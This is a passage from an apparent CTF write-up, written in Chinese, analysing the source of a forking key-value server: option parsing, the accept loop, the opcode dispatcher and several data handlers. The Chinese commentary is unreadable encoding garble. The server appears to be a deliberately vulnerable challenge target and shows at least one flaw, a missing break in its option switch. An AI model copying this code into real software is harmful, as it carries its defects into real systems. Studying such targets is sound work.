class="string">&#x27;t&#x27;</span>:</span><br><span class="line">               timeout = atoi(optarg);</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;l&#x27;</span>:</span><br><span class="line">               log_file = (<span class="keyword">char</span> *)optarg;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">               run_daemon = <span class="number">1</span>;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">               <span class="built_in">std</span>::<span class="built_in">cerr</span></span><br><span class="line">                   &lt;&lt; <span class="string">&quot;kvdb [-p &lt;port&gt;] [-m &lt;max_clients&gt;] [-t &lt;timeout sec&gt;] [-l &lt;log file&gt;] [-d]&quot;</span></span><br><span class="line">                   &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">               <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">               <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; (<span class="string">&quot;HELP: -h&quot;</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">               <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>è§£æå®Œæ¯•åå¯¹å˜é‡çš„èµ‹å€¼å¦‚ä¸‹ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">socks_server_port=<span class="number">9999</span></span><br><span class="line">max_requests=<span class="number">32</span></span><br><span class="line">timeout=<span class="number">10</span></span><br><span class="line">log_file=/dev/null</span><br><span class="line">run_daemon=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±è¿›å…¥äº†<code>init_daemon()</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨å°±æ˜¯ç”Ÿæˆå®ˆæŠ¤è¿›ç¨‹ï¼Œæ„Ÿè§‰å¾ˆæœ‰æ„æ€å¯ä»¥å­¦ä¹ ä¸€ä¸‹ï¼Œç”Ÿæˆå®ˆæŠ¤è¿›ç¨‹åç¨‹åºçš„æ ‡å‡†è¾“å…¥è¾“å‡ºå°±è„±ç¦»ç»ˆç«¯äº†ï¼Œç„¶åè¿›å…¥<code>server_loop()</code>å‡½æ•°åˆ›å»ºæœåŠ¡ç«¯socketï¼Œä¸€ç›´acceptç­‰å¾…è¿æ¥ï¼Œæœ‰è¿æ¥åå†forkä¸€ä¸ªå­è¿›ç¨‹è®©å­è¿›ç¨‹å¤„ç†è¯·æ±‚ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint32 <span class="title">server_loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sock_fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">local_addr</span>, <span class="title">client_addr</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;local_addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(local_addr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* new socket (only IPv4 is supported now) */</span></span><br><span class="line">    <span class="keyword">if</span> ((sock_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;server_loop(): Can not create sock_fd!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* reuse addr */</span></span><br><span class="line">    <span class="keyword">int</span> new_optval = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, &amp;new_optval,</span><br><span class="line">                   <span class="keyword">sizeof</span>(new_optval)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;server_loop(): setsockopt()!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    local_addr.sin_family = AF_INET;</span><br><span class="line">    local_addr.sin_addr.s_addr = htonl(INADDR_ANY);  <span class="comment">// listen addr</span></span><br><span class="line">    local_addr.sin_port = htons(socks_server_port);  <span class="comment">// listen port</span></span><br><span class="line">    <span class="keyword">socklen_t</span> local_addr_len = <span class="keyword">sizeof</span>(local_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bind(sock_fd, (struct sockaddr*)&amp;local_addr, local_addr_len) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;server_loop(): bind()&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (listen(sock_fd, max_requests) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;server_loop(): listen()&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d] Listen on port %d.\n&quot;</span>, getpid(), socks_server_port);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">socklen_t</span> client_addr_len = <span class="keyword">sizeof</span>(client_addr);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;client_addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(client_addr));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">/* loop */</span></span><br><span class="line">        <span class="keyword">if</span> ((client_fd = accept(sock_fd, (struct sockaddr*)&amp;client_addr,</span><br><span class="line">                                &amp;client_addr_len)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;server_loop(): accept()&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* get address info */</span></span><br><span class="line">            <span class="keyword">char</span> ip_str[INET_ADDRSTRLEN+<span class="number">1</span>] = &#123;<span class="number">0</span>&#125;; </span><br><span class="line">            uint16 port;</span><br><span class="line">            inet_ntop(AF_INET, &amp;client_addr.sin_addr.s_addr, ip_str, <span class="keyword">sizeof</span>(ip_str));</span><br><span class="line">            port = ntohs(client_addr.sin_port);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* set TCP_NODELAY */</span></span><br><span class="line">            new_optval = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (setsockopt(client_fd, SOL_TCP, TCP_NODELAY, &amp;new_optval,</span><br><span class="line">                           <span class="keyword">sizeof</span>(new_optval)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">                        <span class="string">&quot;Warnning: Can not setsockopt() for client_fd %d&quot;</span>,</span><br><span class="line">                        client_fd);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* fork process */</span></span><br><span class="line">            <span class="keyword">int</span> pid = fork();</span><br><span class="line">            <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123; <span class="comment">// subprocess</span></span><br><span class="line">                    close(sock_fd);</span><br><span class="line">                    <span class="comment">/* set timeout */</span></span><br><span class="line">                    <span class="keyword">if</span> (timeout) &#123;</span><br><span class="line">                        alarm(timeout);</span><br><span class="line">                        signal(SIGALRM, signal_handler);</span><br><span class="line">                    &#125;</span><br><span class="line">                    </span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;[%d] Connection Established - %s:%d\n&quot;</span>, getpid(), ip_str, port);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* handle */</span></span><br><span class="line">                    <span class="keyword">int</span> res = handle_request(client_fd);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* normal exit */</span></span><br><span class="line">                    close_socket(client_fd);</span><br><span class="line">                    <span class="built_in">exit</span>(res);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123; <span class="comment">// main process </span></span><br><span class="line">                    close(client_fd);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* end loop */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å­è¿›ç¨‹è°ƒç”¨<code>handle_request(fd)</code>å‡½æ•°å¤„ç†è¯·æ±‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint32 <span class="title">handle_request</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> magic_buf[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> op_buf[MAX_OP_SIZE + <span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    uint16 op_len_be = <span class="number">0</span>;</span><br><span class="line">    uint16 op_len_le = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    FETCH_COMMAND:</span><br><span class="line">        <span class="comment">/* check MAGIC */</span></span><br><span class="line">        <span class="built_in">memset</span>(magic_buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(magic_buf));</span><br><span class="line">        <span class="built_in">memset</span>(op_buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(op_buf));</span><br><span class="line">        <span class="keyword">if</span> (readn(sock, magic_buf, MAGIC_SIZE) != MAGIC_SIZE) &#123;</span><br><span class="line">            resp_str(sock, <span class="string">&quot;Bad Magic&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ~<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">memcmp</span>(magic_buf, MAGIC, MAGIC_SIZE)) &#123;</span><br><span class="line">            resp_str(sock, <span class="string">&quot;Bad Magic&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ~<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* read op */</span></span><br><span class="line">        <span class="keyword">if</span> (readn(sock, (<span class="keyword">char</span>*)&amp;op_len_be, <span class="keyword">sizeof</span>(uint16)) != <span class="keyword">sizeof</span>(uint16)) &#123;</span><br><span class="line">            resp_str(sock, <span class="string">&quot;Bad Op Length&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ~<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        op_len_le = BigLittleSwap16(op_len_be);</span><br><span class="line">        <span class="keyword">if</span> (op_len_le &gt; MAX_OP_SIZE) &#123;</span><br><span class="line">            resp_str(sock, <span class="string">&quot;Bad Op Length&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ~<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(op_buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(op_buf));</span><br><span class="line">        readn(sock, op_buf, op_len_le);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* find handler */</span></span><br><span class="line">        op_handler* h = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">for</span> (h = &amp;accepted_ops[<span class="number">0</span>]; h-&gt;opcode[<span class="number">0</span>] &amp;&amp; h-&gt;handler; h++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">memcmp</span>(op_buf, h-&gt;opcode, op_len_le)) &#123;</span><br><span class="line">                <span class="comment">/* call handler */</span></span><br><span class="line">                <span class="keyword">int</span> res = h-&gt;handler(sock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[%d] op_handler_%s() return %d\n&quot;</span>, getpid(),</span><br><span class="line">                        h-&gt;opcode, res);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">                <span class="keyword">goto</span> FETCH_COMMAND;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* unknown opcode return */</span></span><br><span class="line">        resp_str(sock, <span class="string">&quot;Op Not Found&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ~<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆç»è¿‡ä¸€äº›æ£€æŸ¥ï¼Œç„¶åæ ¹æ®æŠ¥æ–‡é‡Œçš„å†…å®¹è°ƒç”¨å¯¹åº”å‡½æ•°ï¼Œå¯é€‰é¡¹ä¸€å…±æœ‰è¿™äº›</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">op_buf=&#123;</span><br><span class="line">    <span class="number">1</span>:<span class="string">b&quot;ADD&quot;</span>, <span class="number">2</span>:<span class="string">b&quot;DEL&quot;</span>,<span class="number">3</span>:<span class="string">b&quot;MDF&quot;</span>,<span class="number">4</span>:<span class="string">b&quot;RNM&quot;</span>,</span><br><span class="line">    <span class="number">5</span>:<span class="string">b&quot;CPY&quot;</span>,<span class="number">6</span>:<span class="string">b&quot;GET&quot;</span>,<span class="number">7</span>:<span class="string">b&quot;DUM&quot;</span>,<span class="number">8</span>:<span class="string">b&quot;CLR&quot;</span>,</span><br><span class="line">    <span class="number">9</span>:<span class="string">b&quot;SHU&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¿™äº›é€‰é¡¹å¯¹åº”çš„å‡½æ•°å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">op_handler</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> opcode[MAX_OP_SIZE + <span class="number">1</span>];</span><br><span class="line">    uint32 (*handler)(<span class="keyword">int</span>);</span><br><span class="line">&#125; accepted_ops[] = &#123;</span><br><span class="line">    &#123;OPCODE_ADD, op_handler_ADD&#125;,       &#123;OPCODE_DELETE, op_handler_DEL&#125;,</span><br><span class="line">    &#123;OPCODE_MODIFY, op_handler_MDF&#125;,    &#123;OPCODE_RENAME, op_handler_RNM&#125;,</span><br><span class="line">    &#123;OPCODE_COPY, op_handler_CPY&#125;,      &#123;OPCODE_GET, op_handler_GET&#125;,</span><br><span class="line">    &#123;OPCODE_SHUTDOWN, op_handler_SHUT&#125;, &#123;OPCODE_DUMP, op_handler_DUMP&#125;,</span><br><span class="line">    &#123;OPCODE_CLEAR, op_handler_CLR&#125;,     &#123;OPCODE_TREM, <span class="literal">NULL</span>&#125;&#125;;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­æ¯”è¾ƒå…³é”®çš„å°±æ˜¯<code>op_handler_ADD()</code>,<code>op_handler_DEL</code>,<code>op_handler_RNM</code>,<code>op_handler_MDF</code>,<code>op_handler_GET</code>,<code>op_handler_DUMP</code>è¿™å‡ ä¸ªå‡½æ•°</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint32 <span class="title">op_handler_ADD</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">data_t</span>* key = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!key) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Key Error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">data_t</span>* value = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!value) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Value Error&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">add_data_item</span>(key, value, <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Add Failed&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="built_in">release_data_t</span>(value);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* success */</span></span><br><span class="line">    <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Done&quot;</span>);</span><br><span class="line">    <span class="built_in">release_data_t</span>(key);</span><br><span class="line">    <span class="built_in">release_data_t</span>(value);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">uint32 <span class="title">op_handler_DEL</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">data_t</span>* key = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!key) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Key Error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">delete_data_item</span>(key) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Delete Failed&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* success */</span></span><br><span class="line">    <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Done&quot;</span>);</span><br><span class="line">    <span class="built_in">release_data_t</span>(key);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ä¿®æ”¹value</span></span><br><span class="line"><span class="function">uint32 <span class="title">op_handler_MDF</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">data_t</span>* key = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!key) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Key Error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">data_t</span>* new_value = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!new_value) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Value Error&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">modify_data_item</span>(key, new_value) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Modify Failed&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="built_in">release_data_t</span>(new_value);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* success */</span></span><br><span class="line">    <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Done&quot;</span>);</span><br><span class="line">    <span class="built_in">release_data_t</span>(key);</span><br><span class="line">    <span class="built_in">release_data_t</span>(new_value);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ä¿®æ”¹key</span></span><br><span class="line"><span class="function">uint32 <span class="title">op_handler_RNM</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">data_t</span>* key = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!key) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Old Key Error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">data_t</span>* new_key = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!new_key) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;New Key Error&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* check dup */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">get_data_item</span>(new_key) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Duplicate Key&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="built_in">release_data_t</span>(new_key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">rename_data_item</span>(key, new_key) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Rename Failed&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="built_in">release_data_t</span>(new_key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    